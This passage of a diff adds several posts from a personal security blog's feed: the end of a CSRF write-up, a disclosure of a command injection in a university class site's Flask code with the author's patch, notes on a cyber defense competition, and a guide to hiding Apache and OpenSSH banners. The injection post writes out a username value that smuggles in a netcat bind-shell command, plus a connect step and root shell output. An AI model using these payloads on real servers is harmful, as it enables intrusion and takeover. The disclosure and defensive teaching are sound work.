+<p>Nothing fancy here, just a simple hidden form with the values you want to submit
+to the page, and some JS that submits the form.</p>
+
+<p>A caveat: Yes, it is true that you would
+have to guess the proper field names (&ldquo;posts&rdquo;, &ldquo;news_title&rdquo;) but even if you can
+only guess &ldquo;posts&rdquo;, you can write anything into the body of the news post.</p>
+
+<p>End result looks something like this.</p>
+
+<p><img src="/images/ieee_csrf.gif" alt="" /></p>
+
+<p>There was an identical bug in the code that handles editing users. Let&rsquo;s
+have some fun!</p>
+
+<p><img src="/images/ieee_csrf2.gif" alt="" /></p>
+
+<p>In both of these gifs, the admin user was logged in, and then they opened
+a malicious html file, simulating visiting a malicious website. The mere act of
+opening the web page triggered the payload which sent the POST to the server,
+adding the news, and changing the user.</p>
+
+<p>So how do we fix this sort of thing? The most common way involves the server
+requiring a randomly generated, non-predictable token that is associated with
+the user session with each request. An example could be that every time the
+actual admin web interface form is loaded, it contains a hidden field, invisible
+to the admin, with this token that is sent along with the request. The server
+verifies that it sent this token out previously, and that the token hasn&rsquo;t expired,
+and if everything else checks out, the request goes through.
+This crucial missing piece of information will prevent attackers from
+successfully faking requests as the authenticated user.</p>
+<div class="footnotes">
+<hr/>
+<ol>
+<li id="fn:1">
+<p>For more examples of how to trigger your CSRF payload via JavaScript, check out the excellent <a href="http://edgeguides.rubyonrails.org/security.html#cross-site-request-forgery-csrf">Ruby on Rails Security Guide</a><a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
+</ol>
+</div>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[iHackedIT]]></title>
+    <link href="http://blog.mark.lc/blog/2014/03/01/ihackedit/"/>
+    <updated>2014-03-01T14:00:00-05:00</updated>
+    <id>http://blog.mark.lc/blog/2014/03/01/ihackedit</id>
+    <content type="html"><![CDATA[<p><em>Discovering, patching, and exploiting a simple command injection webapp</em></p>
+
+<h2>Introduction</h2>
+
+<p>The university that I study at, <a href="http://neu.edu">Northeastern</a> has an awesome <a href="http://www.northeastern.edu/entrepreneurs/">Entrepreneurs Club</a>. One of the programs that they run is called <a href="http://www.northeastern.edu/entrepreneurs/programs/imadeit/">iMadeIT</a> which is a series of workshops designed to help entrepreneurs with a nontechnical background to learn about web development. This post is going go over a vulnerability I discovered in the iMadeIT class website, how I patched, and how an attacker might exploit it in a real situation.</p>
+
+<h2>Background</h2>
+
+<p>The workshops are taught using <a href="http://flask.pocoo.org/">Flask</a>, a Python microframework for web development known for its simplicity and ease of use for beginners. Students taking the class would sign up at <a href="http://imadeit.nu">imadeit.nu</a>, which would make them an account on the website for class management purposes, but also would interestingly create an account for them on the server running the iMadeIT site as well as allow them to &ldquo;register&rdquo; a TCP port to run their Flask app on. This would allow students to have a live link on the internet so they could show off what they&rsquo;ve been working on to people (instead of just running on localhost) without requiring everyone to have their own server.</p>
+
+<h2>The Vulnerability</h2>
+
+<p>Anyway, the iMadeIT guys open sourced the <a href="https://github.com/imadeitnortheastern/spring2014">code</a> that runs their imadeit.nu website and since it is actually written in Flask which is something I&rsquo;ve been meaning to learn for a while now, I decided to take a look at it to see if I could understand anything.</p>
+
+<p>After poking around in the code for a bit, I noticed this particularly interesting function:</p>
+
+<pre><code class="python">def create(name, password):
+    {...}
+    return os.system('useradd -p {} -s /bin/bash -d /home/{} -m {}'.format(enc_pass, name, name))
+</code></pre>
+
+<p>This is what gives the user their own account on the server. If we trace the function calls, we can see that this function is called from the <code>create_account</code> function. Heavily edited to only show relevant sections, it looks like this:</p>
+
+<pre><code class="python">def create_account():
+    {...}
+    name = request.form['create_username']
+    pw = request.form['create_pw']
+    {...}
+    user.create(name, pw)
+    {...}
+</code></pre>
+
+<p>Notice anything? The username is taken from the webpage form and directly passed into the <code>create</code> function without any type of sanitization, creating a classic <a href="https://www.owasp.org/index.php/Command_Injection">command injection</a> vulnerability. What this essentially means is that it&rsquo;s possible for an attacker to put a specially formatted string in the username field that will allow them to execute arbitrary commands on the server.</p>
+
+<p>For example, under ordinary circumstances, a user might enter &ldquo;mark&rdquo; as their username, so the <code>os.system()</code> call would execute:</p>
+
+<pre><code class="sh">useradd -p {encrypted password} -s /bin/bash -d /home/mark -m mark
+</code></pre>
+
+<p>Let&rsquo;s say a user entered &ldquo;mark; ls -l #&rdquo;. Now, <code>os.system()</code> is going to execute:</p>
+
+<pre><code class="sh">useradd -p {encrypted password} -s /bin/bash -d /home/mark; ls -l; # -m mark; ls -l #
+</code></pre>
+
+<p>This will create the user &ldquo;mark&rdquo;, but it will also cause <code>ls -l</code> to be executed, which will list the files in the directory. Now the user that entered this in the form isn&rsquo;t going to see anything; the command executes internally on the server. Hopefully you&rsquo;re seeing now why this is bad - anyone can execute any command on the server as the user that is running the Flask app. In this case it&rsquo;s particularly bad, because the app is running on port 80 of the server which is a &ldquo;privileged&rdquo; port. Since only the superuser is allowed to run network services on ports below 1024, essentially anyone now has root access to the server.</p>
+
+<p>As a side note, the &ldquo;#&rdquo; in the injection is there to comment out the rest of the command (the &ldquo;-m&rdquo; part) so it doesn&rsquo;t interfere with the injection.</p>
+
+<h2>Patching</h2>
+
+<p>This is actually a really easy vulnerability to protect against, all that&rsquo;s required is to make sure that that the username and password fields are checked in some form before they are sent to the system call. In this case, we don&rsquo;t have to worry about the password, because it goes through encryption before being used in the system call, so any attempts to inject in the password field would fail when the attacker&rsquo;s injection gets encrypted.</p>
+
+<p>To check the username input, it&rsquo;s important to use a <a href="https://www.owasp.org/index.php/Positive_security_model">positive security model</a> (a whitelist) over a negative one. This is because using a blacklist of specific characters that aren&rsquo;t allowed can be potentially incomplete and leaves the attacker room to find sneaky ways to exploit this vulnerability using alternative characters that aren&rsquo;t in your blacklist. As a general rule, it&rsquo;s better to use a whitelist of only the characters that are permitted. In this case, for a username, let&rsquo;s say that users should only be allowed to have usernames with lowercase letters, uppercase letters, underscores, and periods. Writing a function to check for this would look like this:</p>
+
+<pre><code class="python">import re
+def valid_username(name):
+    if re.search('[^\w.]', name):
+        return False
+    else
+        return True
+</code></pre>
+
+<p>In this particular approach, we aren&rsquo;t <em>really</em> sanitizing the input, we&rsquo;re just checking it&rsquo;s validity. In this case, if this function returned false, the <code>create_account</code> function would fail, and we would show an error to the user. An alternative would be to attempt to correct invalid user input by removing invalid characters, however despite potential UX arguments, I think it&rsquo;s personally better just to halt completely and let the user sort it out on their end.</p>
+
+<h3>Exploiting</h3>
+
+<p>Now that we&rsquo;ve described how the vulnerability works, and how to protect against it, let&rsquo;s dirty our white hats a little and check out some steps an attacker might take once discovering the vulnerability.</p>
+
+<p>First of all, we know that we can execute arbitrary commands on the server as the root user. To most, this pretty much is already the definition of being 0wned. However, doing so is sort of awkward; we have to go to the login form and create a new user for every command we want to execute. Let&rsquo;s use netcat to create a rudimentary backdoor into the system by telling netcat to listen on an arbitrary port (say, 1337) and executing a certain file upon receiving a connection (say, <code>/bin/sh</code>).</p>
+
+<p>This command looks like</p>
+
+<pre><code class="sh">$ netcat -l -p 1337 -e /bin/sh
+</code></pre>
+
+<p>and so our injection would look like</p>
+
+<pre><code class="sh">mark; netcat -l -p 1337 -e /bin/sh &amp; #
+</code></pre>
+
+<p>Notice that I added a &ldquo;&amp;&rdquo; before the &ldquo;#&rdquo; in the injection. This will cause the backdoor to run in the background because otherwise the flask process would stop while the backdoor is running, and the webapp would stop working. Not very stealthy. When we enter this into the create account form, we won&rsquo;t get any sort of confirmation that our backdoor is working, however we&rsquo;ll know soon enough when we test it. To connect, all we need to do is run</p>
+
+<pre><code>$ netcat [ip address] 1337
+</code></pre>
+
+<p>which will attempt to create a simple TCP connection to the IP address of the server on the same port you specified earlier. If it worked, you won&rsquo;t get a prompt, but you&rsquo;ll have a shell that you can enter commands at. With spaces added for ease of reading, this looks like</p>
+
+<pre><code>$ netcat 1.2.3.4 1337
+
+ls
+imadeit.db
+imadeit.py
+schema.sql
+static
+templates
+user.py
+user.pyc
+
+whoami
+root
+
+echo $SHELL
+/bin/bash
+</code></pre>
+
+<p>Now, the server has been totally owned. Next steps could include adding your ssh public key to the <code>~/.ssh/authorized_keys</code> file for enhanced persistence if the server got restarted, or if someone saw your backdoor and killed it. In a situation where the app wasn&rsquo;t running on port 80 and was running on a nonprivileged port instead, you wouldn&rsquo;t necessarily have root access so you would then use a local exploit to escalate privileges. However for this situation, even exploiting this vulnerability at all is sort of pointless because the webapp actually <em>creates an account for you</em> on the server which you can ssh into, and legitimately get a shell.</p>
+
+<h2>Conclusion</h2>
+
+<p>I hope you can see now how even something as simple as checking user input in a webapp can go a long way in securing your web site and making sure you don&rsquo;t get hacked. After discovering the vuln, I submitted a pull request to iMadeIT&rsquo;s repo on github, which was merged and deployed an astonishing <a href="https://github.com/imadeitnortheastern/spring2014/pull/1"><em>5 minutes</em></a> later, so serious props to them for that. I&rsquo;ve never discovered a serious vulnerability &ldquo;in the wild&rdquo; before, so it was sort of cool to go through the process of submitting the patch and then confirming that it was working in the live site.</p>
+
+<p>That&rsquo;s all, thanks for reading!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[CCDC Regional Qualifiers 2014]]></title>
+    <link href="http://blog.mark.lc/blog/2014/01/25/ccdc2014/"/>
+    <updated>2014-01-25T23:56:00-05:00</updated>
+    <id>http://blog.mark.lc/blog/2014/01/25/ccdc2014</id>
+    <content type="html"><![CDATA[<p><em>Thoughts on the Collegiate Cyber Defense Competition 2014 regional qualifiers</em></p>
+
+<p>Today, from approximately 10:00 am to 6:00 pm, I competed with 7 other students on Northeastern University&rsquo;s Cyber Defense team in the Northeast Collegiate Cyber Defense Competition. It was a great experience, and although it wasn&rsquo;t exactly what I expected, I still had a lot of fun.</p>
+
+<h2>Overview</h2>
+
+<p>Basically, the way this competition works is each team is given the IT infrastructure of a small business and it is their task to lock down the security of the infrastructure. They have to do this while under attack from a Red Team of hackers who are trying to break in and exfiltrate sensitive data (credit card info, <a href="https://en.wikipedia.org/wiki/Personally_identifiable_information">PII</a>, etc.), or just generally mess with and pwn you. In this case, we were managing an e-commerce website that included a web server running a CMS, a DNS (and MySQL, interestingly) server, a firewall, a mail server, and a FTP server.</p>
+
+<h2>Approach</h2>
+
+<p>Personally, myself and a teammate tag teamed securing the DNS/database server. This was an important box to secure because if it got pwnt, an attacker would be able to disrupt the DNS of the e-commerce site, disrupt email, and most importantly, potentially dump the database and exfiltrate sensitive information. Throughout the course of the competition, we implemented basic security measures such as changing default passwords for important system and database accounts, and killing unnecessary network services (such as ntpd, sshd, and apache in our case) as well as more involve measures such as skin-tight iptables rules that controlled specifically what traffic would be able to reach our box, and audit rules that would monitor directories/binaries that an attacker on the system would probably modify or execute.</p>
+
+<h2>Expectations</h2>
+
+<p>At the beginning of the competition, I had a bit of an adrenaline rush going because I was constantly waiting for the red team to come out of nowhere and own us in some place that we hadn&rsquo;t thought of, or secured yet, or <em>something</em>. Over time that rush wore off because&hellip;the red team never seemed to show up. At no point in the competition did we see any signs of unauthorized access on our box, or even potentially malicious traffic reaching it. Although I do appreciate it, this was a bit of a letdown, given my expectations of getting totally wrecked by the red team.</p>
+
+<h2>Results</h2>
+
+<p>Ultimately, our team did well enough that we were able to place among the top teams competing and qualify for the Northeast regional competition to be held in March in New Hampshire. Definitely excited for that; I&rsquo;ve learned a ton about cyber defense by getting involved with the team and I&rsquo;m looking forward to putting it to use at the real event!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Banner Hiding on Ubuntu 12.04]]></title>
+    <link href="http://blog.mark.lc/blog/2014/01/10/banner-hiding/"/>
+    <updated>2014-01-10T17:30:00-05:00</updated>
+    <id>http://blog.mark.lc/blog/2014/01/10/banner-hiding</id>
+    <content type="html"><![CDATA[<p>In most cases, the first phase of any sort of cyber-attack is the &ldquo;fingerprinting&rdquo; phase. This essentially involves an attacker attempting to ascertain as much information as possible about the target in question, say, a web server also running an ssh service. Some basic pieces of info that the attacker would be interesting in gathering would be the OS installed on the server, and the types of web and ssh servers running as well as version numbers for all of these. With this info, at the very least, the attacker would be able to google <em>&ldquo;[web/ssh server] [version] vulnerabilities&rdquo;</em>, so you can see how it might be a good idea to keep this sort of info hidden. Of course, there is a valid <a href="http://en.wikipedia.org/wiki/Security_through_obscurity">security through obscurity</a> argument to be made here, and even the Apache docs<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> themselves state that</p>
+
+<blockquote><p>&hellip;disabling the Server: header does nothing at all to make your server more secure; the idea of &ldquo;security through obscurity&rdquo; is a myth and leads to a false sense of safety.</p></blockquote>
+
+<p>While I can see how it&rsquo;s not acceptable to use obscurity as a complete solution for potential vulnerabilities, I disagree with the assertion that it does &ldquo;nothing at all.&rdquo; Obviously, everyone should aim to make their systems secure at a fundamental level, and obscurity is no substitute for that, however every little bit that you can do to make it more challenging for an attacker, in order to bolster <em>your existing security implementation</em>, is worth it, in my opinion.</p>
+
+<p>Moving back to the original topic, you might be surprised to know how much of this information (services, version numbers) your server gives away by default. For example, let&rsquo;s take a look at the response headers from a default Apache install:</p>
+
+<p><a href="http://img.svbtle.com/sgoa4yt9b3putw.png"><img src="https://d23f6h5jpj26xu.cloudfront.net/sgoa4yt9b3putw_small.png" alt="Screen_Shot_2013-12-15_at_1.38.13_AM.png" /></a></p>
+
+<p>Right off the bat, we can see that we&rsquo;re giving away our OS, web server, and version. Let&rsquo;s make it a little harder for an attacker and hide everything except for &ldquo;Apache&rdquo;, which can be done with a trivial edit to your <code>/etc/apache2/apache2.conf</code> file. Simply append the following lines at the end of the file.</p>
+
+<pre><code>ServerTokens Prod
+ServerSignature Off
+</code></pre>
+
+<p>Technically all you really need is the first line, which will do what we want, but the second line will also remove server info in Apache generated pages (error pages, directory listings), so it&rsquo;s probably a good idea too. That gets us this far:</p>
+
+<p><a href="http://img.svbtle.com/1gs6rgbxmeliq.png"><img src="https://d23f6h5jpj26xu.cloudfront.net/1gs6rgbxmeliq_small.png" alt="Screen_Shot_2013-12-15_at_2.01.18_AM.png" /></a></p>
+
+<p>Unfortunately, &ldquo;Apache&rdquo; is as far as we can go with these configuration files; there is no option to turn the server header completely off. However, there is one other thing we can do&hellip; get out your hex editors<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>, boys, we&rsquo;re going binary patching! Yes, you heard me right, we&rsquo;re going to directly edit the apache2 binary and remove that pesky banner string.</p>
+
+<p>First off, I recommend making a copy of the binary so if you really screw something up, you can easily get back to where you were. Then get out hexedit and search in the ASCII section for the string &ldquo;Apache&rdquo;. Eventually you&rsquo;ll see some familiar strings all in a row, with the Apache version numbers, etc. There are a couple of them; they represent the different options with the &ldquo;ServerTokens&rdquo; config. The &ldquo;Prod&rdquo; option corresponds to the first instance of &ldquo;Apache&rdquo; there, so let&rsquo;s change it to &ldquo;LOLche&rdquo;. Make sure to only overwrite the existing bytes and nothing more, because doing otherwise could cause other problems with the binary.</p>
+
+<p><a href="http://img.svbtle.com/tok3zivx32pngq.png"><img src="https://d23f6h5jpj26xu.cloudfront.net/tok3zivx32pngq_small.png" alt="Screen_Shot_2013-12-15_at_2.17.43_AM.png" /></a></p>
+
+<p>Restart the apache service, and violá! We&rsquo;re officially running a &ldquo;LOLche&rdquo; web server.</p>
+
+<p><a href="http://img.svbtle.com/rhhj4sha4u4jug.png"><img src="https://d23f6h5jpj26xu.cloudfront.net/rhhj4sha4u4jug_small.png" alt="Screen Shot 2013-12-15 at 2.24.33 AM.png" /></a></p>
+
+<p>While we&rsquo;re messing with these headers, I should point out that you can also add your own headers too. Make sure you have the mod_headers.c Apache module enabled, and then simply append the following to your <code>/etc/apache2/httpd.conf</code>.</p>
+
+<pre><code>&lt;IfModule mod_headers.c&gt;
+    Header set Servar "y u look here go away"
+&lt;/IfModule&gt;
+</code></pre>
+
+<p>Which gives you:</p>
+
+<p><a href="http://img.svbtle.com/9lml4ymw40acog.png"><img src="https://d23f6h5jpj26xu.cloudfront.net/9lml4ymw40acog_small.png" alt="Screen_Shot_2013-12-15_at_2.30.28_AM.png" /></a></p>
+
+<p>Similar to Apache, OpenSSH also gives out a bunch of information by default.</p>
+
+<pre><code>$ nc localhost 22
+SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1
+</code></pre>
+
+<p>To get rid of the Debian information, just add this line to your <code>/etc/ssh/sshd_config</code>.</p>
+
+<pre><code>DebianBanner no
+</code></pre>
+
+<p>However, this still leaves all the OpenSSH stuff. A more complete solution would be to patch the sshd binary in the same way we did the apache binary.</p>
+
+<p>In addition to screwing with people that are physically looking at these headers and stuff, making these quick fixes also makes an nmap port scan much less effective, since this is primarily where nmap gets its information about what services you&rsquo;re running.</p>
+
+<p>Just to reiterate, these configurations are <em>not</em> designed to be security solutions in and of themselves, but are simply meant to bolster your existing security practices and make it just a little harder for attackers to do their thing.</p>
+<div class="footnotes">
+<hr/>
+<ol>
+<li id="fn:1">
+<p>http://httpd.apache.org/docs/current/mod/core.html<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
+<li id="fn:2">
+<p>I guess you could also use a plain text editor just as well also.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
+</ol>
+</div>
+
+]]></content>
+  </entry>
+  
+</feed>
